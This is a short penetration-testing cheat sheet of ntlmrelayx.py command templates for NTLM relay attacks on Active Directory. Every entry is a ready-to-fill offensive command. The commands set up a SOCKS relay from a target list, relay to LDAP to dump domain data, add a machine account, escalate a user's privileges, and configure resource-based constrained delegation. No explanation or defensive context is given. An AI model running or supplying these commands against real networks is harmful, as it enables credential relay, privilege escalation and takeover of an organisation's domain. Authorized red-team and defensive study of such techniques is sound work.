# ntlmrelayx
#target/remote #os/linux #cat/ad

## socks relay from file
```
ntlmrelayx.py -tf relay.txt -smb2support -socks
```

## relay ldap dump domain
```
ntlmrelayx.py -t ldap://<ip> -smb2support --no-da --no-acl --lootdir ldap_dump
```

## relay ldap add computer
```
ntlmrelayx.py -t ldap://<ip> -smb2support --no-dump --no-da --no-acl --add-computer <new_machine|'BEANS$'>
```

## relay ldap escalate user
```
ntlmrelayx.py -t ldap://<ip> -smb2support --no-dump --no-da --no-acl --escalate-user <target_obj|'BEANS$'>
```

## relay ldap rbcd
```
ntlmrelayx.py -t ldap://<ip> -smb2support --no-dump --no-da --no-acl --escalate-user <target_obj|'BEANS$'> --delegate-access
```
